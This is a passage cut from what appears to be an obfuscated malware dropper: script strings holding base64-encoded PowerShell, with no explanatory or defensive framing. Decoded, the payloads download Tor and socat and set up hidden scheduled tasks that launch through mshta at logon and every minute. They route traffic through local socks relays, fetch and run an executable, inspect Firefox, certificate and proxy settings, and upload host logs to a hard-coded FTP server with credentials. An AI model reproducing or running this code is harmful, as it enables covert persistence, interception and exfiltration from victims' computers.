l&quot;+&quot;dERpcmVjdG9yaWVzKEZGUHJvZmlsZSwgIiouZGVmYXVsdCIpWzBdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJl&quot;+&quot;dHVybiAiIjsKICAgIH0KCXB1YmxpYyBieXRlW10gR2V0Q2VydEFzQnl0ZUFycmF5KFN0cmluZyBzQ2VydCkKICAgIHsKICAgICAg&quot;+&quot;ICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc0NlcnQpOwogICAgICAg&quot;+&quot;IH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKXt9CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICB9Cglwcml2YXRlIERpcmVjdG9y&quot;+&quot;eUluZm8gR2V0SVAoKQogICAgewogICAgICAgIERpcmVjdG9yeUluZm8gZnAgPSBudWxsOwogICAgICAgIC8vIGdldCBmaXJlZm94&quot;+&quot;IHBhdGggZnJvbSByZWdpc3RyeQogICAgICAgIC8vIHdlJ2xsIHNlYXJjaCB0aGUgMzJiaXQgaW5zdGFsbCBsb2NhdGlvbgogICAg&quot;+&quot;ICAgIFJlZ2lzdHJ5S2V5IGxvY2FsTWFjaGluZTEgPSBSZWdpc3RyeS5Mb2NhbE1hY2hpbmUuT3BlblN1YktleShAIlNPRlRXQVJF&quot;+&quot;XE1vemlsbGFcTW96aWxsYSBGaXJlZm94IiwgZmFsc2UpOwogICAgICAgIC8vIGFuZCBsZXRzIHRyeSB0aGUgNjRiaXQgaW5zdGFs&quot;+&quot;bCBsb2NhdGlvbiBqdXN0IGluIGNhc2UKICAgICAgICBSZWdpc3RyeUtleSBsb2NhbE1hY2hpbmUyID0gUmVnaXN0cnkuTG9jYWxN&quot;+&quot;YWNoaW5lLk9wZW5TdWJLZXkoQCJTT0ZUV0FSRVxXb3c2NDMyTm9kZVxNb3ppbGxhXE1vemlsbGEgRmlyZWZveCIsIGZhbHNlKTsK&quot;+&quot;CiAgICAgICAgaWYgKGxvY2FsTWFjaGluZTEgIT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIHRyeQogICAgICAgICAgICB7&quot;+&quot;CiAgICAgICAgICAgICAgICBzdHJpbmdbXSBpbnN0YWxsZWRWZXJzaW9ucyA9IGxvY2FsTWFjaGluZTEuR2V0U3ViS2V5TmFtZXMo&quot;+&quot;KTsKICAgICAgICAgICAgICAgIC8vIHdlJ2xsIHRha2UgdGhlIGZpcnN0IGluc3RhbGxlZCB2ZXJzaW9uLCBwZW9wbGUgbm9ybWFs&quot;+&quot;bHkgb25seSBoYXZlIG9uZQogICAgICAgICAgICAgICAgaWYgKGluc3RhbGxlZFZlcnNpb25zLkxlbmd0aCA9PSAwKQogICAgICAg&quot;+&quot;ICAgICAgICAgICAgIHRocm93IG5ldyBJbmRleE91dE9mUmFuZ2VFeGNlcHRpb24oIk5vIGluc3RhbGxzIG9mIGZpcmVmb3ggcmVj&quot;+&quot;b3JkZWQgaW4gaXRzIGtleS4iKTsKCiAgICAgICAgICAgICAgICBSZWdpc3RyeUtleSBtYWluSW5zdGFsbCA9IGxvY2FsTWFjaGlu&quot;+&quot;ZTEuT3BlblN1YktleShpbnN0YWxsZWRWZXJzaW9uc1swXSk7CgogICAgICAgICAgICAgICAgLy8gZ2V0IGluc3RhbGwgZGlyZWN0&quot;+&quot;b3J5CiAgICAgICAgICAgICAgICBzdHJpbmcgaW5zdGFsbFN0cmluZyA9IChzdHJpbmcpbWFpbkluc3RhbGwuT3BlblN1YktleSgi&quot;+&quot;TWFpbiIpLkdldFZhbHVlKCJJbnN0YWxsIERpcmVjdG9yeSIsIG51bGwpOwoKICAgICAgICAgICAgICAgIGlmIChpbnN0YWxsU3Ry&quot;+&quot;aW5nID09IG51bGwpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IE51bGxSZWZlcmVuY2VFeGNlcHRpb24oIkluc3RhbGwg&quot;+&quot;c3RyaW5nIHdhcyBudWxsIik7CgogICAgICAgICAgICAgICAgZnAgPSBuZXcgRGlyZWN0b3J5SW5mbyhpbnN0YWxsU3RyaW5nKTsK&quot;+&quot;ICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKQogICAgICAgICAgICB7CiAgICAgICAgICAgIH0KICAg&quot;+&quot;ICAgICB9CiAgICAgICAgZWxzZSBpZiAobG9jYWxNYWNoaW5lMiAhPSBudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdHJ5CiAg&quot;+&quot;ICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN0cmluZ1tdIGluc3RhbGxlZFZlcnNpb25zID0gbG9jYWxNYWNoaW5lMi5HZXRT&quot;+&quot;dWJLZXlOYW1lcygpOwogICAgICAgICAgICAgICAgLy8gd2UnbGwgdGFrZSB0aGUgZmlyc3QgaW5zdGFsbGVkIHZlcnNpb24sIHBl&quot;+&quot;b3BsZSBub3JtYWxseSBvbmx5IGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoaW5zdGFsbGVkVmVyc2lvbnMuTGVuZ3RoID09&quot;+&quot;IDApCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEluZGV4T3V0T2ZSYW5nZUV4Y2VwdGlvbigiTm8gaW5zdGFsbHMgb2Yg&quot;+&quot;ZmlyZWZveCByZWNvcmRlZCBpbiBpdHMga2V5LiIpOwoKICAgICAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG1haW5JbnN0YWxsID0g&quot;+&quot;bG9jYWxNYWNoaW5lMi5PcGVuU3ViS2V5KGluc3RhbGxlZFZlcnNpb25zWzBdKTsKCiAgICAgICAgICAgICAgICAvLyBnZXQgaW5z&quot;+&quot;dGFsbCBkaXJlY3RvcnkKICAgICAgICAgICAgICAgIHN0cmluZyBpbnN0YWxsU3RyaW5nID0gKHN0cmluZyltYWluSW5zdGFsbC5P&quot;+&quot;cGVuU3ViS2V5KCJNYWluIikuR2V0VmFsdWUoIkluc3RhbGwgRGlyZWN0b3J5IiwgbnVsbCk7CgogICAgICAgICAgICAgICAgaWYg&quot;+&quot;KGluc3RhbGxTdHJpbmcgPT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgTnVsbFJlZmVyZW5jZUV4Y2VwdGlv&quot;+&quot;bigiSW5zdGFsbCBzdHJpbmcgd2FzIG51bGwiKTsKICAgICAgICAgICAgICAgIGZwID0gbmV3IERpcmVjdG9yeUluZm8oaW5zdGFs&quot;+&quot;bFN0cmluZyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbikKICAgICAgICAgICAgewogICAgICAg&quot;+&quot;ICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmcDsKICAgIH0KfQoiQDsKW0VoZG1IR21MQnpNWEtsXTo6TW1NYVJ1d3Vo&quot;+&quot;QlJaQ1IoKS55SnVXeGRseXVOKCIlQ0VSVCUiKTsKfQpMR0N4d0JNSGFr&quot;,    Ghq: &quot;JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s9MTsKJFNIX1RZUEVfVEFTS19TQ0hFRFVMRVI9MjsKJHNjaGVkdWxlclR5cGU9JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s7CmZ1bmN0aW9uIEZWUkNsc2dnTVJBWgp7CnBhcmFtKFtzdHJpbmddJHppcGZpbGUsIFtzdHJpbmdd&quot;+&quot;JGRlc3RpbmF0aW9uKTsKJDd6ID0gSm9pbi1QYXRoICRlbnY6QUxMVVNFUlNQUk9GSUxFICc3emEuZXhlJzsKaWYgKC1OT1QgKFRlc3QtUGF0aCAkN3opKXsKVHJ5CnsKKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6&quot;+&quot;Ly9jaG9jb2xhdGV5Lm9yZy83emEuZXhlJywkN3opOwp9CkNhdGNoe30KfQppZiAoJChUcnkgeyBUZXN0LVBhdGggJDd6LnRyaW0oKSB9IENhdGNoIHsgJGZhbHNlIH0pKXsKU3RhcnQtUHJvY2VzcyAiJDd6IiAtQXJndW1lbnRMaXN0ICJ4IC1vYCIkZGVzdGluYXRp&quot;+&quot;b25gIiAteSBgIiR6aXBmaWxlYCIiIC1XYWl0IC1Ob05ld1dpbmRvdwp9CmVsc2V7CiRzaGVsbCA9IG5ldy1vYmplY3QgLWNvbSBzaGVsbC5hcHBsaWNhdGlvbjsKJHppcCA9ICRzaGVsbC5OYW1lU3BhY2UoJHppcGZpbGUpOwpmb3JlYWNoKCRpdGVtIGluICR6aXAu&quot;+&quot;aXRlbXMoKSkKewokc2hlbGwuTmFtZXNwYWNlKCRkZXN0aW5hdGlvbikuY29weWhlcmUoJGl0ZW0pOwp9Cn0KfQpmdW5jdGlvbiBCYXNlNjRUb0ZpbGUKewpwYXJhbShbc3RyaW5nXSRmaWxlLCBbc3RyaW5nXSRzdHJpbmcpOwokYnl0ZXM9W1N5c3RlbS5Db252ZXJ0&quot;+&quot;XTo6RnJvbUJhc2U2NFN0cmluZygkc3RyaW5nKTsKI3NldC1jb250ZW50IC1lbmNvZGluZyBieXRlICRmaWxlIC12YWx1ZSAkYnl0ZXM7CltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkZmlsZSwgJGJ5dGVzKTsKfQpmdW5jdGlvbiBSYW5kb21TdHJpbmd7CiAgICBw&quot;+&quot;YXJhbShbaW50XSRtaW49NSwgW2ludF0kbWF4PTE1KTsKICAgIHJldHVybiAoLWpvaW4gKCg0OC4uNTcpKyg2NS4uOTApKyg5Ny4uMTIyKSB8IEdldC1SYW5kb20gLUNvdW50IChHZXQtUmFuZG9tIC1taW5pbXVtICRtaW4gLW1heGltdW0gJG1heCkgfCAlIHtbY2hh&quot;+&quot;cl0kX30pKTsKfQpmdW5jdGlvbiBJbml0U2NoZWR1bGxlcnsKICAgIHRyeXsKICAgICAgICBJbXBvcnQtTW9kdWxlIFNjaGVkdWxlZFRhc2tzIC1FcnJvckFjdGlvbiBTdG9wOwogICAgICAgIHJldHVybiAkU0hfVFlQRV9TQ0hFRFVMRURfVEFTSzsKICAgIH1jYXRj&quot;+&quot;aHsKICAgICAgICAkRmlsZT0kZW52OlRlbXArJ1wnKyhSYW5kb21TdHJpbmcpKycuemlwJzsKICAgICAgICAkRGVzdD0kZW52OlRlbXArJ1wnKyhSYW5kb21TdHJpbmcpOwogICAgICAgIHdoaWxlICghKGlHZ1JMY3lJSlFCenJBICdodHRwczovL2FwaS5udWdldC5v&quot;+&quot;cmcvcGFja2FnZXMvdGFza3NjaGVkdWxlci4yLjUuMjMubnVwa2cnICRGaWxlKSkge30KICAgICAgICBpZiAoKFRlc3QtUGF0aCAkRGVzdCkgLWVxIDEpe1JlbW92ZS1JdGVtIC1Gb3JjZSAtUmVjdXJzZSAkRGVzdDt9bWtkaXIgJERlc3QgfCBPdXQtTnVsbDsKICAg&quot;+&quot;ICAgICBGVlJDbHNnZ01SQVogJEZpbGUgJERlc3Q7CiAgICAgICAgUmVtb3ZlLUl0ZW0gLUZvcmNlICRGaWxlOwogICAgICAgICRUU0Fzc2VtYmx5PSREZXN0KydcbGliXG5ldDIwXE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLmRsbCc7CiAgICAgICAgJGxv&quot;+&quot;YWRMaWIgPSBbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkRmlsZSgkVFNBc3NlbWJseSk7CiAgICAgICAgcmV0dXJuICRTSF9UWVBFX1RBU0tfU0NIRURVTEVSOwogICAgfQp9CmZ1bmN0aW9uIHhybk9scmoKewpwYXJhbShbc3RyaW5nXSRuYW1lLCBb&quot;+&quot;c3RyaW5nXSRjbWQsIFtzdHJpbmddJHBhcmFtcz0nJyxbaW50XSRyZXN0YXJ0PTAsW2ludF0kZGVsYXk9MCxbc3RyaW5nXSRkaXI9JycpOwpzd2l0Y2ggKCRzY2hlZHVsZXJUeXBlKSB7CiAgICAkU0hfVFlQRV9TQ0hFRFVMRURfVEFTSyB7CiAgICAgICAgJEFjdGlv&quot;+&quot;biA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICRjbWQ7CiAgICAgICAgaWYoLU5vdCBbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkcGFyYW1zKSl7CiAgICAgICAgICAgICRBY3Rpb24uQXJndW1lbnRzPSRwYXJhbXM7CiAgICAgICAgfQogICAgICAg&quot;+&quot;IGlmKC1Ob3QgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJGRpcikpewogICAgICAgICAgICAkQWN0aW9uLldvcmtpbmdEaXJlY3Rvcnk9JGRpcjsKICAgICAgICB9CiAgICAgICAgJExvZ29uVHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dP&quot;+&quot;bjsKICAgICAgICB0cnl7CiAgICAgICAgICAgICRMb2dvblRyaWdnZXIuVXNlcklkPSRlbnY6dXNlcm5hbWU7CiAgICAgICAgfWNhdGNoewogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLlVzZXI9JGVudjp1c2VybmFtZTsKICAgICAgICB9CiAgICAgICAgaWYoLU5v&quot;+&quot;dCAkZGVsYXkgLWVxIDApewogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLkRlbGF5PU5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkZGVsYXk7CiAgICAgICAgfQogICAgICAgIGlmKCRyZXN0YXJ0IC1lcSAxKXsKICAgICAgICAgICAgJFRpbWVUcmlnZ2VyID0gTmV3LVNj&quot;+&quot;aGVkdWxlZFRhc2tUcmlnZ2VyIC1PbmNlIC1BdCAxMmFtIC1SZXBldGl0aW9uSW50ZXJ2YWwgKFtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tTWludXRlcygxKSkgLVJlcGV0aXRpb25EdXJhdGlvbiAoW1N5c3RlbS5UaW1lU3Bhbl06OkZyb21EYXlzKDM2NSAqIDIwKSk7&quot;+&quot;CiAgICAgICAgfQogICAgICAgICRTZXR0aW5ncyA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQ7CiAgICAgICAgJFNldHRpbmdzLkRpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICRTZXR0aW5ncy5TdG9wSWZHb2luZ09uQmF0&quot;+&quot;dGVyaWVzID0gJEZhbHNlOwogICAgICAgIGlmKCRyZXN0YXJ0IC1lcSAxKXsKICAgICAgICAgICAgJFRhc2sgPSBSZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1BY3Rpb24gJEFjdGlvbiAtVHJpZ2dlciAkTG9nb25UcmlnZ2VyLCRUaW1lVHJpZ2dlciAtU2V0dGluZ3Mg&quot;+&quot;JFNldHRpbmdzIC1UYXNrTmFtZSAkbmFtZSAtRGVzY3JpcHRpb24gKFJhbmRvbVN0cmluZyk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRUYXNrID0gUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtQWN0aW9uICRBY3Rpb24gLVRyaWdnZXIgJExvZ29uVHJpZ2dl&quot;+&quot;ciAtU2V0dGluZ3MgJFNldHRpbmdzIC1UYXNrTmFtZSAkbmFtZSAtRGVzY3JpcHRpb24gKFJhbmRvbVN0cmluZyk7CiAgICAgICAgfQogICAgICAgIFN0YXJ0LVNjaGVkdWxlZFRhc2sgLUlucHV0T2JqZWN0ICRUYXNrOwogICAgfTsKICAgIERlZmF1bHQgewogICAg&quot;+&quot;ICAgICR0cz1OZXctT2JqZWN0IE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLlRhc2tTZXJ2aWNlOwogICAgICAgICR0ZD0kdHMuTmV3VGFzaygpOwogICAgICAgICR0ZC5SZWdpc3RyYXRpb25JbmZvLkRlc2NyaXB0aW9uID0gKFJhbmRvbVN0cmluZyk7CiAg&quot;+&quot;ICAgICAgJHRkLlNldHRpbmdzLkRpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICR0ZC5TZXR0aW5ncy5TdG9wSWZHb2luZ09uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICR0ZC5TZXR0aW5ncy5NdWx0aXBsZUluc3RhbmNlcyA9&quot;+&quot;IFtNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5UYXNrSW5zdGFuY2VzUG9saWN5XTo6SWdub3JlTmV3OwogICAgICAgICRMb2dvblRyaWdnZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLkxvZ29uVHJpZ2dlcjsKICAgICAg&quot;+&quot;ICAkTG9nb25UcmlnZ2VyLlN0YXJ0Qm91bmRhcnk9W1N5c3RlbS5EYXRlVGltZV06Ok5vdzsKICAgICAgICAkTG9nb25UcmlnZ2VyLlVzZXJJZD0kZW52OnVzZXJuYW1lOwogICAgICAgICRMb2dvblRyaWdnZXIuRGVsYXk9W1N5c3RlbS5UaW1lU3Bhbl06OkZyb21T&quot;+&quot;ZWNvbmRzKCRkZWxheSk7CiAgICAgICAgJHRkLlRyaWdnZXJzLkFkZCgkTG9nb25UcmlnZ2VyKTsKICAgICAgICBpZigkcmVzdGFydCAtZXEgMSl7CiAgICAgICAgJFRpbWVUcmlnZ2VyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5U&quot;+&quot;aW1lVHJpZ2dlcjsKICAgICAgICAkVGltZVRyaWdnZXIuU3RhcnRCb3VuZGFyeT1bU3lzdGVtLkRhdGVUaW1lXTo6Tm93OwogICAgICAgICRUaW1lVHJpZ2dlci5SZXBldGl0aW9uLkludGVydmFsPVtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tTWludXRlcygxKTsKICAg&quot;+&quot;ICAgICAkVGltZVRyaWdnZXIuUmVwZXRpdGlvbi5TdG9wQXREdXJhdGlvbkVuZD0kRmFsc2U7CiAgICAgICAgJHRkLlRyaWdnZXJzLkFkZCgkVGltZVRyaWdnZXIpOwogICAgICAgIH0KICAgICAgICAkdHNmPSJNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlciI7&quot;+&quot;CiAgICAgICAgJEV4ZWNBY3Rpb249TmV3LU9iamVjdCAiJHRzZi5FeGVjQWN0aW9uIigkY21kLCRwYXJhbXMsJGRpcik7CiAgICAgICAgJHRkLkFjdGlvbnMuQWRkKCRFeGVjQWN0aW9uKTsKICAgICAgICAkdGFzaz0kdHMuUm9vdEZvbGRlci5SZWdpc3RlclRhc2tE&quot;+&quot;ZWZpbml0aW9uKCRuYW1lLCAkdGQpOwogICAgICAgICR0YXNrLlJ1bigpOwogICAgfTsKfQp9CmZ1bmN0aW9uIGlHZ1JMY3lJSlFCenJBIHsKICAgIHBhcmFtKFtzdHJpbmddJEFFVExjbml0S25hTnFyLCBbc3RyaW5nXSRhRW50c0JNdHNheUIpOwogICAgJEVycm9y&quot;+&quot;QWN0aW9uUHJlZmVyZW5jZSA9ICJTdG9wIjsKICAgIFdyaXRlLUhvc3QgKCJEb3dubG9hZCB7MH0gdG8gezF9IiAtZiAoJEFFVExjbml0S25hTnFyLCAkYUVudHNCTXRzYXlCKSk7CiAgICB0cnkgewogICAgICAgIFN0YXJ0LUJpdHNUcmFuc2ZlciAtU291cmNlICRB&quot;+&quot;RVRMY25pdEtuYU5xciAtRGVzdGluYXRpb24gJGFFbnRzQk10c2F5QjsKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICAjV3JpdGUtRXJyb3IgJF8gLUVycm9yQWN0aW9uIENvbnRpbnVlOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIChOZXctT2JqZWN0IFN5c3Rl&quot;+&quot;bS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJEFFVExjbml0S25hTnFyLCRhRW50c0JNdHNheUIpOwogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICNXcml0ZS1FcnJvciAkXyAtRXJyb3JBY3Rpb24gQ29udGludWU7CiAgICAgICAgICAg&quot;+&quot;IFN0YXJ0LVByb2Nlc3MgImNtZC5leGUiIC1Bcmd1bWVudExpc3QgIi9iIC9jIGJpdHNhZG1pbiAvdHJhbnNmZXIgL2Rvd25sb2FkIC9wcmlvcml0eSBISUdIIGAiJEFFVExjbml0S25hTnFyYCIgYCIkYUVudHNCTXRzYXlCYCIiIC1XYWl0IC1XaW5kb3dTdHlsZSBI&quot;+&quot;aWRkZW47CiAgICAgICAgfQogICAgfWZpbmFsbHl7CiAgICAgICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJDb250aW51ZSI7CiAgICB9CiAgICBpZiAoICQoVHJ5IHsgVGVzdC1QYXRoICRhRW50c0JNdHNheUIudHJpbSgpIH0gQ2F0Y2ggeyAkZmFsc2UgfSkp&quot;+&quot;ewogICAgICAgIHJldHVybiAkdHJ1ZTsKICAgIH0KICAgIHJldHVybiAkZmFsc2U7Cn0KZnVuY3Rpb24gSXdvUE1jewokc2NoZWR1bGVyVHlwZSA9IEluaXRTY2hlZHVsbGVyOwokdGY9JGVudjpUZW1wKydcJysoUmFuZG9tU3RyaW5nKSsnLnppcCc7CiREZXN0VFA9&quot;+&quot;JGVudjpBTExVU0VSU1BST0ZJTEUrJ1wnKyhSYW5kb21TdHJpbmcpOwokVG9yTWlycm9ycz1AKCJodHRwczovL2Rpc3QudG9ycHJvamVjdC5vcmcvIiwKImh0dHBzOi8vdG9ycHJvamVjdC5taXJyb3IubWV0YWxnYW1lci5ldS9kaXN0LyIsCiJodHRwczovL3Rvci55&quot;+&quot;YnRpLm5ldC9kaXN0LyIpOwpmb3JlYWNoICgkbWlycm9yIGluICRUb3JNaXJyb3JzKSB7CiAgICAkX3VybD0kbWlycm9yKyd0b3Jicm93c2VyLzcuMC4xMS90b3Itd2luMzItMC4zLjEuOS56aXAnOwogICAgaWYoKGlHZ1JMY3lJSlFCenJBICRfdXJsICR0Zikpewog&quot;+&quot;ICAgICAgIGJyZWFrOwogICAgfQp9CmlmICgoVGVzdC1QYXRoICREZXN0VFApIC1lcSAxKXtSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2UgJERlc3RUUDt9bWtkaXIgJERlc3RUUCB8IE91dC1OdWxsOwpGVlJDbHNnZ01SQVogJHRmICREZXN0VFA7ClJlbW92ZS1J&quot;+&quot;dGVtIC1Gb3JjZSAkdGY7CiR5a0Y9JERlc3RUUCsnXFRvclwnOwokV3FQZnY9InZic2NyaXB0OmNsb3NlKENyZWF0ZU9iamVjdChgIldTY3JpcHQuU2hlbGxgIikuUnVuKGAidG9yLmV4ZWAiLDAsRmFsc2UpKSI7Cnhybk9scmogKFJhbmRvbVN0cmluZykgJ21zaHRh&quot;+&quot;LmV4ZScgJFdxUGZ2IDAgMCAkeWtGOwokU0ZpbGU9JGVudjpUZW1wKydcJysoUmFuZG9tU3RyaW5nKSsnLnppcCc7CndoaWxlICghKGlHZ1JMY3lJSlFCenJBICdodHRwczovL2dpdGh1Yi5jb20vU3R1ZGlvRXRyYW5nZS9zb2NhdC13aW5kb3dzL2FyY2hpdmUvMS43&quot;+&quot;LjIuMS56aXAnICRTRmlsZSkpe30KRlZSQ2xzZ2dNUkFaICRTRmlsZSAkRGVzdFRQOwokc19vbGQ9JERlc3RUUCsnXHNvY2F0LXdpbmRvd3MtMS43LjIuMVwnOwokc19uZXc9KFJhbmRvbVN0cmluZyk7ClJlbW92ZS1JdGVtIC1Gb3JjZSAkU0ZpbGU7ClJlbmFtZS1J&quot;+&quot;dGVtIC1wYXRoICRzX29sZCAtbmV3TmFtZSAkc19uZXc7CiRkTGtkT2R2cz0kRGVzdFRQKydcJyskc19uZXcrJ1wnOwokczFjbWQ9J3NvY2F0IHRjcDQtTElTVEVOOjU1NTUscmV1c2VhZGRyLGZvcmssa2VlcGFsaXZlLGJpbmQ9MTI3LjAuMC4xIFNPQ0tTNEE6MTI3&quot;+&quot;LjAuMC4xOiVET01BSU4lOjgwLHNvY2tzcG9ydD05MDUwJzsKJHMyY21kPSdzb2NhdCB0Y3A0LUxJU1RFTjo1NTg4LHJldXNlYWRkcixmb3JrLGtlZXBhbGl2ZSxiaW5kPTEyNy4wLjAuMSBTT0NLUzRBOjEyNy4wLjAuMTolRE9NQUlOJTo1NTg4LHNvY2tzcG9ydD05&quot;+&quot;MDUwJzsKJFN5QVN4Vj0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5SdW4oYCIkczFjbWRgIiwwLEZhbHNlKSkiOwokQ2tlSGFFTW9RYj0idmJzY3JpcHQ6Y2xvc2UoQ3JlYXRlT2JqZWN0KGAiV1NjcmlwdC5TaGVsbGAiKS5S&quot;+&quot;dW4oYCIkczJjbWRgIiwwLEZhbHNlKSkiOwp4cm5PbHJqIChSYW5kb21TdHJpbmcpICdtc2h0YS5leGUnICRTeUFTeFYgMCAwICRkTGtkT2R2czsKeHJuT2xyaiAoUmFuZG9tU3RyaW5nKSAnbXNodGEuZXhlJyAkQ2tlSGFFTW9RYiAwIDAgJGRMa2RPZHZzOwokd1hk&quot;+&quot;UmJDRnduPSJ2YnNjIisicmlwdDpjbG9zZShDcmVhdGVPYmplY3QoYCJXU2NyaXB0LlNoZWxsYCIpLlJ1bihgInBvd2Vyc2hlbGwuZXhlIGAiYCJgJEY9YCRlbnY6VGVtcCsnXFwiKyhSYW5kb21TdHJpbmcpKyIuZXhlJztybSAtRm9yY2UgYCRGO2AkY2w9KE5ldy1P&quot;+&quot;YmplY3QgTmV0LldlYkNsaWVudCk7YCRjbC5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly8xMjcuMC4wLjE6NTU1NS8iKyhSYW5kb21TdHJpbmcpKyIuYXNwP3RzJmlwPScrYCRjbC5Eb3dubG9hZGAiK2AiU3RyaW5nKCdodHRwOi8vYXBpLmlwaWZ5Lm9yZy8nKSxgJEYpOyYg&quot;+&quot;YCRGYCJgImAiLDAsRmFsc2UpKSI7Cnhybk9scmogKFJhbmRvbVN0cmluZykgJ21zaHRhLmV4ZScgJHdYZFJiQ0Z3biAxOwp9Ckl3b1BNYzs=&quot;,    EMAoYeN: &quot;JExvZ2ZpbGUgPSAkZW52OlRlbXArIlxcJChnYyBlbnY6Y29tcHV0ZXJuYW1lKS5sb2ciOwoKRnVuY3Rpb24gTG9nV3JpdGUKewogIFBhcmFtIChbc3RyaW5nXSRsb2dzdHJpbmcpCiAgJGR0PUdldC1EYXRlIC1Gb3JtYXQgImRkLk1NLnl5eXkgSEg6bW06c3MiOwog&quot;+&quot;ICRtc2c9W3N0cmluZ106OkZvcm1hdCgiW3swfV06Olt7MX1dIiwkZHQsJGxvZ3N0cmluZyk7CiAgV3JpdGUtSG9zdCAkbXNnOwogIEFkZC1jb250ZW50ICRMb2dmaWxlIC12YWx1ZSAkbXNnOwp9CkZ1bmN0aW9uIFVwbG9hZExvZwp7CiAgJGRlc3QgPSAiZnRwOi8v&quot;+&quot;cmRrdW5kOnJhaW5kYW5jZUBmdHAxLndtLm5ldC91cGQiOwogICR3ZWJjbGllbnQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTmV0LldlYkNsaWVudDsKICAkd2ViY2xpZW50LlVwbG9hZEZpbGUoIiRkZXN0LyQoZ2MgZW52OmNvbXB1dGVybmFtZSkubG9n&quot;+&quot;IiwgJExvZ2ZpbGUpOwogIFJlbW92ZS1JdGVtIC1QYXRoICRMb2dmaWxlOwp9CmZ1bmN0aW9uIENoZWNrSW5zdGFsbCgpewogICR3aW5pbmZvID0gKEdldC1XbWlPYmplY3QgV2luMzJfT3BlcmF0aW5nU3lzdGVtIHwgU2VsZWN0IENhcHRpb24sIFNlcnZpY2VQYWNr&quot;+&quot;TWFqb3JWZXJzaW9uLCBPU0FyY2hpdGVjdHVyZSwgVmVyc2lvbiwgTVVJTGFuZ3VhZ2VzKTsKICAkd2luaW5mby5NVUlMYW5ndWFnZXM9JHdpbmluZm8uTVVJTGFuZ3VhZ2VzIC1qb2luICIsIjsKICBMb2dXcml0ZSgiT1MgaW5mbzogezB9IiAtZiAkd2luaW5mbyAt&quot;+&quot;am9pbiAiIik7CiAgaWYgKHRlc3QtcGF0aCB2YXJpYWJsZTpwc3ZlcnNpb250YWJsZSkgewogICAgJHZlcnNpb24gPSAkcHN2ZXJzaW9udGFibGUucHN2ZXJzaW9uOwogIH0gZWxzZSB7CiAgICAkdmVyc2lvbiA9IFt2ZXJzaW9uXSIxLjAuMC4wIjsKICB9CiAgTG9n&quot;+&quot;V3JpdGUoIlBvd2Vyc2hlbGwgdmVyc2lvbjogezB9IiAtZiAkdmVyc2lvbik7CiAgdHJ5IHsKICAgICRwYWM9R2V0LUl0ZW1Qcm9wZXJ0eSAnaGtjdTpcU29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXEludGVybmV0IFNldHRpbmdz&quot;+&quot;XCd8U2VsZWN0IC1leHBhbmQgQXV0b0NvbmZpZ1VSTCAtRXJyb3JBY3Rpb24gU3RvcDsKICAgIExvZ1dyaXRlKCJQYWMgc2V0dGVkOiAnJHBhYyciKTsKICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBQYWMgbm90IHNldHRlZCIpOwogIH0KICAkQ2Vy&quot;+&quot;dHMgPSB